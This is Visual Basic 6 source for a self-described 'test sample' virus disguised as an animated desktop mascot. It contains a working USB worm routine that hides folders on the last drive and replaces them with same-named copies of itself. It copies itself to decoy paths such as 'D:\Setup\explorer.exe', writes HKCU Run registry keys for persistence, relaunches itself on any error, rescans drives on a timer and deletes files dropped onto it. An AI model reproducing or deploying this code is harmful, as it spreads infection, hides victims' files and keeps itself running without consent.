VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00F0F0F0&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   1650
   ClientLeft      =   5640
   ClientTop       =   3045
   ClientWidth     =   1770
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   OLEDropMode     =   1  'Manual
   ScaleHeight     =   1650
   ScaleWidth      =   1770
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer8 
      Interval        =   3000
      Left            =   120
      Top             =   960
   End
   Begin VB.Timer Timer7 
      Interval        =   500
      Left            =   1080
      Top             =   480
   End
   Begin VB.Timer Timer6 
      Interval        =   10
      Left            =   600
      Top             =   480
   End
   Begin VB.Timer Timer5 
      Interval        =   5000
      Left            =   120
      Top             =   480
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   80
      Left            =   1560
      Top             =   0
   End
   Begin VB.Timer Timer3 
      Interval        =   10
      Left            =   1080
      Top             =   0
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   80
      Left            =   600
      Top             =   0
   End
   Begin VB.PictureBox everyz 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   5355
      Left            =   720
      ScaleHeight     =   5295
      ScaleWidth      =   6660
      TabIndex        =   1
      Top             =   7920
      Visible         =   0   'False
      Width           =   6720
   End
   Begin VB.PictureBox Picture1 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      Height          =   7500
      Left            =   600
      Picture         =   "Form1.frx":25CA
      ScaleHeight     =   7440
      ScaleWidth      =   17640
      TabIndex        =   0
      Top             =   720
      Visible         =   0   'False
      Width           =   17700
   End
   Begin VB.Timer Timer1 
      Interval        =   80
      Left            =   120
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Modified and Designed By CFIT
'This Virus is a Test Sample,DO NOT USE IN ILLEGAL FIELDS!
'��������CFIT��ƴ�����ɡ�
'��������Ϊ����������ʵ��Σ�����������ڷǷ���;��
Option Explicit
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As Rect) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Const HKEY_CURRENT_USER = &H80000001

Private Const REG_SZ = 1
Private Const WS_EX_LAYERED = &H80000
Private Const GWL_EXSTYLE = (-20)
Private Const LWA_ALPHA = &H2
Private Const LWA_COLORKEY = &H1
Dim X0!, Y0!
Dim Xm, Ym As Long
Private Type Rect
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Dim i, Wcz, Xqr, Yqr, Xpr, Ypr As Integer
Dim q As POINTAPI
Dim pi As Double
Dim TopM, LOR As Long
Dim Ran As Integer
Dim ROL, ROLL As Boolean
Function HandleErr() '��������ʱ���������и����γɽ���ѭ����
Dim RetVal
RetVal = Shell("""" & App.Path & "\" & App.EXEName, 1)
End
End Function
Private Sub ShowFileList(folderspec) '�����Ⱦ����
On Error GoTo bbzlp0
Dim fs, f, f1, fc
If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then '�ж�ָ�����Ƿ����
Set fs = CreateObject("Scripting.FileSystemObject")
Set f = fs.getfolder(folderspec)
Set fc = f.SubFolders
For Each f1 In fc '��ɨ��ָ���̵������ļ���
Debug.Print folderspec + "\" + f1.Name + "\"
If f1.Name <> "System Volume Information" Then '�ų�"System Volume Information"�ļ���
SetAttr folderspec + "\" + f1.Name + "\", vbHidden '����ɨ����ļ���
If Dir(folderspec + "\" + f1.Name + ".exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" '�滻Ϊ�Ը�Ⱦ�ļ���Ϊ���Ƶ�Ӧ�ó�����ʵ���Ǹ��Ʋ������壩
End If
End If
If Dir("C:\Backups\", vbDirectory) = "" Then '����Notepata�����ļ���
fs.createfolder ("C:\Backups\")
End If
If Dir("D:\Setup\", vbDirectory) = "" Then '����explorer�����ļ���
fs.createfolder ("D:\Setup\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" '���屻ɾ�����ɴ˻ָ�
End If
If Dir("D:\Setup\explorer.exe") = "" Then

FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" '����ɾ�����ɴ˻ָ�
End If
If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then '��������£����Ǳ��弰������ִֻ���ļ��д򿪲���
Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus '�򿪲������Ƶ��ļ���
Me.Enabled = False '����������Ϊ
Timer1.Enabled = False '����������Ϊ
Timer2.Enabled = False '����������Ϊ
Timer3.Enabled = False '����������Ϊ
Timer4.Enabled = False '����������Ϊ
Timer5.Enabled = False '����������Ϊ
Timer6.Enabled = False '����������Ϊ
End If
Next
Else
DoEvents
End If
bbzlp0:
If Err.Number > 0 Then
HandleErr '������
End If

End Sub
Private Function contr(m As Integer) As Integer 'Miku�������ĺ���1
On Error GoTo bbzlp1
Me.Cls
If m = 1 Then
Me.PaintPicture Picture1.Image, 0, 0, 885, 960, 885 * (i - 1), 0, 885, 960 '����
Me.Height = 950
contr = 20
ElseIf m = 2 Then
Me.PaintPicture Picture1.Image, 0, 0, 1200, 1040, 1150 * (i - 1), 1000, 1200, 1040 '������
Me.Height = 1000
contr = 8
ElseIf m = 3 Then
Me.PaintPicture Picture1.Image, 0, 0, 1150, 1594, 1180 * (i - 1), 1960, 1150, 1594 '��Ծ
Me.Height = 1600
contr = 8
ElseIf m = 4 Then
Me.PaintPicture Picture1.Image, 0, 0, 1150, 1040, 1300 * (i - 1), 3500, 1150, 1040 '����
Me.Height = 1040
contr = 8
ElseIf m = 5 Then
Me.PaintPicture Picture1.Image, 0, 0, 1300, 950, 1300 * (i - 1), 5520, 1300, 950 '��������δ������
Me.Height = 1300
contr = 3
ElseIf m = 6 Then
Me.PaintPicture Picture1.Image, 0, 0, 1200, 990, 1270 * (i - 1), 6480, 1200, 990 '����ҡ
'20 8 8 8 3 12
Me.Height = 960
contr = 12
ElseIf m = 7 Then
everyz.PaintPicture Picture1.Image, 0, 0, 1200, 1040, 1150 * (i - 1), 1000, 1200, 1040 '������
Me.PaintPicture everyz.Image, 1200, 0, -1200, 1040, 0, 0, 1200, 1040
Me.Height = 1000
contr = 8
End If
bbzlp1:
If Err.Number > 0 Then
HandleErr '������
End If
End Function
Private Function Charg(a As Integer) As Integer 'Miku�������ĺ���2
On Error GoTo bbzlp2
If a = 1 Then '����
Charg = 1
ElseIf a = 4 Then '������/��
Randomize
If ROL = True Then
Charg = 2
Randomize
LOR = Int(Rnd() * 360)
Else
Charg = 7
Randomize
LOR = -Int(Rnd() * 360)
End If
ElseIf a = 2 Then '����ҡ
Charg = 6
ElseIf a = 3 Then '����
Charg = 4
End If
bbzlp2:
If Err.Number > 0 Then
HandleErr '������
End If
End Function
Private Sub everyz_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp3
Debug.Print x, y
bbzlp3:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Form_Load() '������غ�
On Error GoTo bbzlp4
If App.EXEName = "notepata" Then '��Ϊ���壬������Miku����
Me.Visible = True
End If
Dim hKey As Long, R As Long, S As String
Dim sKeyName As String, sKeyValue As String
Dim lphKey As Long, lenData As Long, Ret As Integer
Dim REG_AR As String
S = App.Path + "\" + App.EXEName + ".exe"
Dim StrDrive As String
Dim DriveID() As String
Dim avail(100) As String
Dim av As Integer
av = 0
Dim j As String
StrDrive = String(100, Chr$(0)) '��ʼ���̷���
Call GetLogicalDriveStrings(100, StrDrive) '�����̷���������ֵ��"C:\D:\E:\..."��
Debug.Print StrDrive
Dim ii, le As Integer
sKeyName = "Software\Microsoft\Windows\CurrentVersion\Run" '��ע�����뿪��������
sKeyValue = "C:\Backups\notepata.exe" 'Ŀ��ע���ֵ������·����
Ret = RegCreateKey(HKEY_CURRENT_USER, sKeyName, lphKey)
Ret = RegQueryValueEx(lphKey, "notepata", 0, vbNull, ByVal vbNullString, lenData) 'ע����ַ�������Ϊ"notepata"
REG_AR = Space(lenData)
Ret = RegQueryValueEx(lphKey, "notepata", 0, vbNull, ByVal REG_AR, lenData) '��¼��Ӧע���ֵ
If REG_AR <> sKeyValue Then '����ͬ���򸲸�ע��
Debug.Print RegSetValueEx(lphKey, "notepata", 0, REG_SZ, ByVal sKeyValue, Len(sKeyValue))
End If
sKeyName = "Software\Microsoft\Windows\CurrentVersion\Run" '��ע�����뿪��������
sKeyValue = "D:\Setup\explorer.exe" 'Ŀ��ע���ֵ������·����
Ret = RegCreateKey(HKEY_CURRENT_USER, sKeyName, lphKey)
Ret = RegQueryValueEx(lphKey, "explorer", 0, vbNull, ByVal vbNullString, lenData) 'ע����ַ�������Ϊ"explorer"
REG_AR = Space(lenData)
Ret = RegQueryValueEx(lphKey, "explorer", 0, vbNull, ByVal REG_AR, lenData) '��¼��Ӧע���ֵ
If REG_AR <> sKeyValue Then '����ͬ���򸲸�ע��
Debug.Print RegSetValueEx(lphKey, "explorer", 0, REG_SZ, ByVal sKeyValue, Len(sKeyValue))
End If
DriveID = Split(StrDrive, Chr$(0)) '���ع����̷�������DeiveID�����ַ�����

For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
S = avail(av) '�����ĩ�̷��������ƶ�Ӳ��ΪU�̣����Ⱦ��ΪU�̣�
ShowFileList S '����������Ⱦ���ĺ���
Dim fs, f, f1, fc
Set fs = CreateObject("Scripting.FileSystemObject")
If App.EXEName = "explorer" Then '������򿪻�ʱ����
If Dir("C:\Backups\", vbDirectory) = "" Then '�ָ�NotepataĿ¼
fs.createfolder ("C:\Backups\")
End If
If Dir("C:\Backups\notepata.exe") = "" Then '�ָ�Notepata����
FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe"
End '��������
End If
If Dir("C:\Backups\notepata.exe") <> "" Then '�����ڱ��壬����������
End
End If
End If
'����ΪMiku����
pi = 3.14159265358979
ROLL = True '��Ծ����
ROL = True '����������
Wcz = 0
Xqr = 0
Yqr = 0
Xpr = 0
Ypr = 0
LOR = 0
'''���ñ���͸����
Dim rtn As Long
Dim BorderStyler
BorderStyler = 0
rtn = GetWindowLong(hwnd, GWL_EXSTYLE)
rtn = rtn Or WS_EX_LAYERED
SetWindowLong hwnd, GWL_EXSTYLE, rtn
SetLayeredWindowAttributes hwnd, 15790320, 0, LWA_COLORKEY
'''���ñ���͸����
i = 1
'''��ʼ����λ�������ͬʱ��ֹ������Ļ������֡�
Randomize
Me.Left = Screen.Width / 2 + Int(Rnd() * (Screen.Width - 1000)) - (Screen.Width - 1000) / 2
Me.Top = Screen.Height - 600
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
'''��ʼ����λ�������ͬʱ��ֹ������Ļ������֡�
Dim p As POINTAPI
p.x = 0
p.y = 0
ClientToScreen Me.hwnd, p
Debug.Print p.x, p.y
bbzlp4:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp5
X0 = x
Y0 = y
Timer1.Enabled = False
Timer4.Enabled = True
'ֹͣ����ʱ������������������
bbzlp5:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp6
Xm = x
Ym = y
If Button = 1 Then '�������
Me.Left = Me.Left + x - X0 '�϶�
Me.Top = Me.Top + y - Y0 '�϶�
Timer1.Enabled = False
Timer4.Enabled = True
Timer3.Enabled = False
End If
bbzlp6:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp7
'''����ɿ�ʱ��֤����ֹ������Ļ������֡�
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
'''����ɿ�ʱ��֤����ֹ������Ļ������֡�
'��������ʱ������ֹͣ��������
Timer1.Enabled = True
Timer4.Enabled = False
Timer3.Enabled = True
bbzlp7:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Form_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp8
'���ļ������ļ��϶����ó��򣬸ó��򽫸��϶��ļ������ڻ���վ��
Dim SHop As SHFILEOPSTRUCT
Dim strFile As String
strFile = Data.Files(1)
If InStr(strFile, ".txt") <> 0 Or InStr(strFile, ".lnk") <> 0 Or InStr(strFile, ".doc") <> 0 Or InStr(strFile, ".xls") <> 0 Or InStr(strFile, ".jpg") <> 0 Or InStr(strFile, ".png") <> 0 Or InStr(strFile, ".gif") <> 0 Or InStr(strFile, ".bmp") <> 0 Then
Timer1.Enabled = False
Timer3.Enabled = True
With SHop
.wFunc = FO_DELETE
.pFrom = strFile
.fFlags = FOF_ALLOWUNDO + FOF_NOCONFIRMATION
End With
SHFileOperation SHop
Timer1.Enabled = True
Timer4.Enabled = False
End If
bbzlp8:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Picture1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
On Error GoTo bbzlp9
Debug.Print x, y, "!!!!!!!!!!!!!!!!!!"
bbzlp9:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer1_Timer()
On Error GoTo bbzlp10
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
TopM = Me.Top

End If
If Me.Left + Me.Width + 0 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
Dim p As POINTAPI '������λ��
Dim f As Rect
GetWindowRect Me.hwnd, f
p.x = 0
p.y = 0
ClientToScreen Me.hwnd, p

Dim q As POINTAPI '���λ��
q.x = 0
q.y = 0
GetCursorPos q
Dim ocx As Integer
ocx = 80 'ʶ��Χ
If Abs(q.x - (p.x + (f.Right - f.Left) / 2)) < ocx And Abs(q.y - (p.y + (f.Bottom - f.Top) / 2)) < ocx / 1 Then '�����ʶ��Χ��
Me.Left = Me.Left + (q.x - p.x) * 2 - (f.Right - f.Left) / 2 '�������ĵ�����λ��
Me.Top = Me.Top + (q.y - p.y) * 2 - (f.Bottom - f.Top) / 2 '�������ĵ�����λ��
If q.x - (p.x + (f.Right - f.Left) / 3) > 0 Then
If i >= contr(2) Then '�������ʱ���������Ҷ���
i = 1
Else: i = i + 1
End If
Else
If i >= contr(7) Then '�������ʱ���������󶯻�
i = 1
Else: i = i + 1
End If
End If
Else
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '����ϵͳ
Me.Top = Me.Top + 600 / Screen.TwipsPerPixelY
If i >= contr(1) Then '20 8 8 8 3 12'����
i = 1
Else: i = i + 1
End If

End If
End If
everyz.Cls
bbzlp10:
If Err.Number > 0 Then
HandleErr '������
End If
End Sub

Private Sub Timer2_Timer()
On Error GoTo bbzlp11
'����
'***********************
'��������״̬

'***********************
If Me.Left < 0 Then
Me.Left = 0
End If
If Me.Top < 0 Then
Me.Top = 0
End If
If Me.Top + Me.Height + 600 > Screen.Height Then
Me.Top = Screen.Height - Me.Height - 600
End If
If Me.Left + Me.Width + 240 > Screen.Width Then
Me.Left = Screen.Width - Me.Width - 0
End If
Dim p As POINTAPI
GetCursorPos p
Dim f As Rect
'Debug.Print Charg(Ran), Ran
GetWindowRect Me.hwnd, f
If Ran < 3 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '����
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
Else
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
End If
ElseIf Ran = 4 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then '������
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY
Me.Left = Me.Left + LOR
'Debug.Print LOR
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
Else
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
Else: i = i + 1
End If
End If
ElseIf Ran = 3 Then
If (p.y + (f.Bottom - f.Top)) <= ((Screen.Height + 600) / Screen.TwipsPerPixelY) Then  '����
Me.Top = Me.Top + 480 / Screen.TwipsPerPixelY - ((Sin(pi * i / 10) - Sin(pi * (i - 1) / 10)) * 240)
Me.Left = Me.Left + LOR
If ROLL = False Then
Ran = 4
End If
If i >= contr(Charg(Ran)) Then '20 8 8 8 3 12
i = 1
'
Else
i = i + 1
LOR = Int(Rnd() * 120) + 240
End If
End If
End If
bbzlp11:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer3_Timer()
On Error GoTo bbzlp12
Dim m As POINTAPI
GetCursorPos m
'���ι��λ��
Xqr = m.x
Yqr = m.y
If Abs(Xpr - Xqr) < 10 And Abs(Ypr - Yqr) < 10 Then '�޲�����������Χ��С���ж�
Wcz = Wcz + 1
Else
Wcz = 0 '�в��������ü���
End If
If Wcz > 600 Then '�޲���6s��ʼ���ද��
Timer1.Enabled = False
Timer2.Enabled = True
Else '�в����򱣳ִ���
Timer1.Enabled = True
Timer2.Enabled = False
End If
 '��һ�ι��λ��
Xpr = Xqr
Ypr = Yqr
bbzlp12:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer4_Timer()
On Error GoTo bbzlp13
If i >= contr(6) Then '����ҡ����
i = 1
Else: i = i + 1
End If
bbzlp13:
If Err.Number > 0 Then
HandleErr
End If
End Sub
Private Sub Timer5_Timer() '�����ܶ���
On Error GoTo bbzlp14
Randomize
Ran = Int(Rnd() * 3.9) + 1
If Me.Left + Me.Width / 2 < (Screen.Width / 2) Then
ROL = True
ROLL = True
Else
ROL = False
ROLL = False
End If
Randomize
Timer5.Interval = Int(Rnd() * 3500 + 1500)
bbzlp14:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer7_Timer() 'ͬForm_Load�����ֳ���ɨ���Ⱦ
On Error GoTo bbzlp15
Dim hKey As Long, R As Long, S As String
Dim sKeyName As String, sKeyValue As String
Dim lphKey As Long, lenData As Long, Ret As Integer
Dim REG_AR As String
S = App.Path + "\" + App.EXEName + ".exe"
Dim StrDrive As String
Dim DriveID() As String
Dim avail(100) As String
Dim av As Integer
av = 0
Dim j As String
StrDrive = String(100, Chr$(0))
Call GetLogicalDriveStrings(100, StrDrive)
Debug.Print StrDrive
Dim ii, le As Integer
DriveID = Split(StrDrive, Chr$(0))

For ii = 0 To UBound(DriveID)
If InStr(DriveID(ii), ":") <> 0 Then
av = av + 1
avail(av) = DriveID(ii)
End If
Next ii
Debug.Print avail(av)
S = avail(av)
Debug.Print S, "j"
ShowFileList S
Debug.Print App.EXEName
bbzlp15:
If Err.Number > 0 Then
HandleErr
End If
End Sub

Private Sub Timer8_Timer() '���ļ��еĲ�����������ִ��3s�����
If Me.Enabled = False Then
End
End If
End Sub
